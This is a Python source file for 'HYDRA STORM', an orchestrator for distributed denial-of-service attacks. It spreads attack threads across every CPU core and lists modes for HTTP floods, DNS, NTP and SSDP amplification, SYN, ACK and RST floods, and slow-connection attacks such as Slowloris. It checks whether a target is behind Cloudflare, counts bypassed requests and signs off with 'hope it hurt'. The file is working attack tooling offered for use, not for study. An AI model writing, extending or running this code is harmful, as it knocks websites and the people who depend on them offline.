"""
HYDRA STORM v1.0 — DDoS Engine / Orchestrator
Multiprocess attack launcher with shared metrics, live status, graceful shutdown.
"""

import socket
import ssl
import threading
import multiprocessing
import ctypes
import time
import os
import sys
import random
import re
import urllib.request
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Type
from multiprocessing import Value, Process
from http.cookiejar import CookieJar


# ─── ANSI colors ───
class C:
    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
    CY = "\033[96m"; M = "\033[95m"; W = "\033[97m"
    B = "\033[1m"; D = "\033[2m"; X = "\033[0m"


# ============================================================
#  Shared Metrics (multiprocessing-safe)
# ============================================================
class SharedMetrics:
    """
    Cross-process atomic counters via multiprocessing.Value.
    Every worker gets the same SharedMetrics instance (fork-safe).
    """

    def __init__(self) -> None:
        self.packets = Value(ctypes.c_longlong, 0)
        self.data_bytes = Value(ctypes.c_longlong, 0)
        self.connections = Value(ctypes.c_longlong, 0)
        self.errors = Value(ctypes.c_longlong, 0)
        self.bypassed = Value(ctypes.c_longlong, 0)
        self.blocked = Value(ctypes.c_longlong, 0)
        self.t0: float = time.time()

    def hit(self, size: int = 0, bp: bool = False) -> None:
        with self.packets.get_lock():
            self.packets.value += 1
        if size > 0:
            with self.data_bytes.get_lock():
                self.data_bytes.value += size
        if bp:
            with self.bypassed.get_lock():
                self.bypassed.value += 1

    def conn(self) -> None:
        with self.connections.get_lock():
            self.connections.value += 1

    def err(self, blk: bool = False) -> None:
        with self.errors.get_lock():
            self.errors.value += 1
        if blk:
            with self.blocked.get_lock():
                self.blocked.value += 1

    def bar(self) -> str:
        """Live status string — call from the monitor loop."""
        p = self.packets.value
        d = self.data_bytes.value
        c = self.connections.value
        e = self.errors.value
        bp = self.bypassed.value
        elapsed = time.time() - self.t0
        pps = p / elapsed if elapsed > 0 else 0
        mb = d / (1024 * 1024)
        bpr = (bp / p * 100) if p > 0 else 0
        return (
            f"\r  {C.CY}PKT{C.X} {C.G}{p:,}{C.X} │ "
            f"{C.CY}DATA{C.X} {C.Y}{mb:.1f}MB{C.X} │ "
            f"{C.CY}RATE{C.X} {C.M}{pps:,.0f}/s{C.X} │ "
            f"{C.CY}CONN{C.X} {C.W}{c:,}{C.X} │ "
            f"{C.CY}BP{C.X} {C.G}{bpr:.0f}%{C.X} │ "
            f"{C.CY}ERR{C.X} {C.R}{e:,}{C.X} │ "
            f"{C.D}{elapsed:.0f}s{C.X}  "
        )

    def final_report(self) -> str:
        """Formatted final stats."""
        p = self.packets.value
        d = self.data_bytes.value
        c = self.connections.value
        e = self.errors.value
        bp = self.bypassed.value
        blk = self.blocked.value
        elapsed = time.time() - self.t0
        pps = p / elapsed if elapsed > 0 else 0
        mb = d / (1024 * 1024)
        gb = d / (1024 * 1024 * 1024)
        bpr = (bp / p * 100) if p > 0 else 0
        err_rate = (e / p * 100) if p > 0 else 0

        return (
            f"\n"
            f"  {C.R}{C.B}╔══════════════════════════════════════════╗{C.X}\n"
            f"  {C.R}{C.B}║        HYDRA STORM — FINAL REPORT       ║{C.X}\n"
            f"  {C.R}{C.B}╚══════════════════════════════════════════╝{C.X}\n"
            f"\n"
            f"  {C.CY}Duration      {C.X} {C.W}{elapsed:.1f}s{C.X}\n"
            f"  {C.CY}Total Packets {C.X} {C.G}{p:,}{C.X}\n"
            f"  {C.CY}Data Sent     {C.X} {C.Y}{mb:.1f} MB ({gb:.3f} GB){C.X}\n"
            f"  {C.CY}Avg Rate      {C.X} {C.M}{pps:,.0f} pkt/s{C.X}\n"
            f"  {C.CY}Connections   {C.X} {C.W}{c:,}{C.X}\n"
            f"  {C.CY}Bypassed      {C.X} {C.G}{bp:,} ({bpr:.1f}%){C.X}\n"
            f"  {C.CY}Blocked       {C.X} {C.R}{blk:,}{C.X}\n"
            f"  {C.CY}Errors        {C.X} {C.R}{e:,} ({err_rate:.1f}%){C.X}\n"
            f"\n"
            f"  {C.D}─ ENI says: hope it hurt 💋 ─{C.X}\n"
        )


# ============================================================
#  Attack Config
# ============================================================
@dataclass
class AttackConfig:
    """All the knobs for an attack run."""
    target: str                          # domain or IP
    port: int = 443
    mode: str = "http"                   # http, http2, udp, dns, ntp, ssdp, tcp, syn, ack, rst, slowloris, rudy, slowread, ws
    threads_per_core: int = 50
    duration: int = 60                   # seconds, 0 = infinite
    use_ssl: bool = True
    proxy_mode: bool = False
    domain: str = ""                     # explicit domain override
    proxies: List[str] = field(default_factory=list)
    cookies: Dict[str, str] = field(default_factory=dict)
    ws_path: str = "/"
    resolvers: List[str] = field(default_factory=list)
    ntp_servers: List[str] = field(default_factory=list)
    ssdp_targets: List[str] = field(default_factory=list)


# ============================================================
#  Attack Class Registry
# ============================================================
def _get_attack_class(mode: str) -> Type:
    """Lazy import to avoid circular deps. Returns the attack class for the mode."""
    if mode in ("http", "keepalive"):
        from hydra_storm.modules.ddos.http_flood import HTTPKeepAliveFlood
        return HTTPKeepAliveFlood
    elif mode == "http_proxy":
        from hydra_storm.modules.ddos.http_flood import HTTPProxyFlood
        return HTTPProxyFlood
    elif mode == "http2":
        from hydra_storm.modules.ddos.http_flood import HTTP2Flood
        return HTTP2Flood
    elif mode == "udp":
        from hydra_storm.modules.ddos.udp_flood import UDPCannon
        return UDPCannon
    elif mode == "dns":
        from hydra_storm.modules.ddos.udp_flood import DNSAmplification
        return DNSAmplification
    elif mode == "ntp":
        from hydra_storm.modules.ddos.udp_flood import NTPAmplification
        return NTPAmplification
    elif mode == "ssdp":
        from hydra_storm.modules.ddos.udp_flood import SSDPAmplification
        return SSDPAmplification
    elif mode in ("tcp", "hammer"):
        from hydra_storm.modules.ddos.tcp_flood import TCPHammer
        return TCPHammer
    elif mode == "syn":
        from hydra_storm.modules.ddos.tcp_flood import SYNFlood
        return SYNFlood
    elif mode == "ack":
        from hydra_storm.modules.ddos.tcp_flood import ACKFlood
        return ACKFlood
    elif mode == "rst":
        from hydra_storm.modules.ddos.tcp_flood import RSTFlood
        return RSTFlood
    elif mode == "slowloris":
        from hydra_storm.modules.ddos.slowloris import SlowlorisAttack
        return SlowlorisAttack
    elif mode == "rudy":
        from hydra_storm.modules.ddos.slowloris import RUDYAttack
        return RUDYAttack
    elif mode == "slowread":
        from hydra_storm.modules.ddos.slowloris import SlowReadAttack
        return SlowReadAttack
    elif mode in ("ws", "websocket"):
        from hydra_storm.modules.ddos.websocket_flood import WSFlood
        return WSFlood
    else:
        raise ValueError(f"Unknown attack mode: {mode}")


def _build_attack_kwargs(config: AttackConfig, target_ip: str, metrics: SharedMetrics) -> Dict[str, Any]:
    """Build constructor kwargs based on the attack mode."""
    domain = config.domain or config.target

    base: Dict[str, Any] = {
        "target_ip": target_ip,
        "domain": domain,
        "port": config.port,
        "metrics": metrics,
    }

    mode = config.mode.lower()

    if mode in ("http", "keepalive", "http2"):
        base["cookies"] = config.cookies or None
    elif mode == "http_proxy":
        base["proxies"] = config.proxies
        base["cookies"] = config.cookies or None
    elif mode == "dns":
        if config.resolvers:
            base["resolvers"] = config.resolvers
    elif mode == "ntp":
        if config.ntp_servers:
            base["ntp_servers"] = config.ntp_servers
    elif mode == "ssdp":
        if config.ssdp_targets:
            base["ssdp_targets"] = config.ssdp_targets
    elif mode == "slowloris":
        base["use_tls"] = config.use_ssl
    elif mode == "rudy":
        base["use_tls"] = config.use_ssl
    elif mode == "slowread":
        base["use_tls"] = config.use_ssl
    elif mode in ("ws", "websocket"):
        base["ws_path"] = config.ws_path
        base["use_tls"] = config.use_ssl

    return base


# ============================================================
#  CF Detection (lightweight)
# ============================================================
_CF_RANGES = [
    "103.21.244.", "103.22.200.", "103.31.4.", "104.16.", "104.17.",
    "104.18.", "104.19.", "104.20.", "104.21.", "104.22.", "104.23.",
    "104.24.", "104.25.", "104.26.", "104.27.", "108.162.", "131.0.72.",
    "141.101.", "162.158.", "172.64.", "172.65.", "172.66.", "172.67.",
    "173.245.", "188.114.", "190.93.", "197.234.", "198.41.", "199.27.",
]


def _detect_cloudflare(ip: str, domain: str) -> bool:
    """Quick check if the resolved IP is in known CF ranges."""
    for prefix in _CF_RANGES:
        if ip.startswith(prefix):
            print(f"  {C.R}{C.B}⚡ CLOUDFLARE DETECTED ⚡{C.X}  (IP {ip} in {prefix}*)")
            return True

    # Also check server header
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(
            f"https://{domain}/",
            headers={"User-Agent": "Mozilla/5.0 Chrome/126.0.0.0"},
        )
        opener = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=ctx),
            urllib.request.HTTPCookieProcessor(CookieJar()),
        )
        resp = opener.open(req, timeout=8)
        for k, v in resp.headers.items():
            if k.lower() == "server" and "cloudflare" in v.lower():
                print(f"  {C.R}{C.B}⚡ CLOUDFLARE DETECTED ⚡{C.X}  (Server: {v})")
                return True
            if k.lower() == "cf-ray":
                print(f"  {C.R}{C.B}⚡ CLOUDFLARE DETECTED ⚡{C.X}  (CF-Ray: {v})")
                return True
    except Exception:
        pass

    print(f"  {C.G}[✓]{C.X} Not behind Cloudflare")
    return False


# ============================================================
#  Worker Process
# ============================================================
def worker_process(
    attack_class: Type,
    kwargs: Dict[str, Any],
    threads_per_core: int,
    stop_flag: Any,  # multiprocessing.Event
    metrics: SharedMetrics,
) -> None:
    """
    Generic worker: spawns N threads, each running attack_class.fire().
    Runs in a child process.
    """
    # Rebuild the attack instance in this process
    instance = attack_class(**kwargs)

    stop_event = threading.Event()

    def _thread_runner() -> None:
        try:
            instance.fire(stop_event)
        except Exception:
            pass

    threads: List[threading.Thread] = []
    for _ in range(threads_per_core):
        t = threading.Thread(target=_thread_runner, daemon=True)
        t.start()
        threads.append(t)

    # Wait until the multiprocessing stop flag is set
    try:
        while not stop_flag.is_set():
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass

    # Signal all threads to stop
    stop_event.set()

    # Wait for threads to wind down
    for t in threads:
        t.join(timeout=5)


# ============================================================
#  Launch Attack — The Main Entry Point
# ============================================================
def launch_attack(config: AttackConfig) -> None:
    """
    Top-level orchestrator.
    Resolves target, detects CF, spawns processes across CPU cores,
    shows live metrics, handles duration/ctrl+c, prints final report.
    """
    domain = config.domain or config.target
    print(f"\n  {C.CY}[TARGET]{C.X} {C.W}{domain}:{config.port}{C.X}  mode={C.M}{config.mode}{C.X}")

    # ── Resolve ──
    try:
        target_ip = socket.gethostbyname(domain)
        print(f"  {C.CY}[RESOLVE]{C.X} {domain} → {C.Y}{target_ip}{C.X}")
    except socket.gaierror:
        print(f"  {C.R}[ERROR]{C.X} Cannot resolve {domain}")
        return

    # ── CF Detection ──
    is_cf = _detect_cloudflare(target_ip, domain)

    # ── Metrics ──
    metrics = SharedMetrics()

    # ── Attack class & kwargs ──
    try:
        attack_class = _get_attack_class(config.mode)
    except ValueError as e:
        print(f"  {C.R}[ERROR]{C.X} {e}")
        return

    kwargs = _build_attack_kwargs(config, target_ip, metrics)

    # ── Spawn processes ──
    num_cores = os.cpu_count() or 4
    stop_flag = multiprocessing.Event()
    processes: List[Process] = []

    print(
        f"  {C.CY}[ENGINE]{C.X} Spawning {C.G}{num_cores}{C.X} processes × "
        f"{C.G}{config.threads_per_core}{C.X} threads = "
        f"{C.M}{num_cores * config.threads_per_core}{C.X} attack threads"
    )

    for _ in range(num_cores):
        p = Process(
            target=worker_process,
            args=(attack_class, kwargs, config.threads_per_core, stop_flag, metrics),
            daemon=True,
        )
        p.start()
        processes.append(p)

    duration_str = f"{config.duration}s" if config.duration > 0 else "∞"
    print(f"  {C.CY}[ENGINE]{C.X} Duration: {C.Y}{duration_str}{C.X}")
    print(f"  {C.CY}[ENGINE]{C.X} Press {C.R}Ctrl+C{C.X} to stop\n")

    # ── Live monitor ──
    try:
        start = time.time()
        while True:
            sys.stdout.write(metrics.bar())
            sys.stdout.flush()
            time.sleep(0.5)

            if config.duration > 0 and (time.time() - start) >= config.duration:
                print(f"\n\n  {C.Y}[TIME]{C.X} Duration reached — stopping...")
                break
    except KeyboardInterrupt:
        print(f"\n\n  {C.R}[ABORT]{C.X} Caught Ctrl+C — shutting down...")

    # ── Shutdown ──
    stop_flag.set()

    for p in processes:
        p.join(timeout=10)
        if p.is_alive():
            p.terminate()

    print(metrics.final_report())
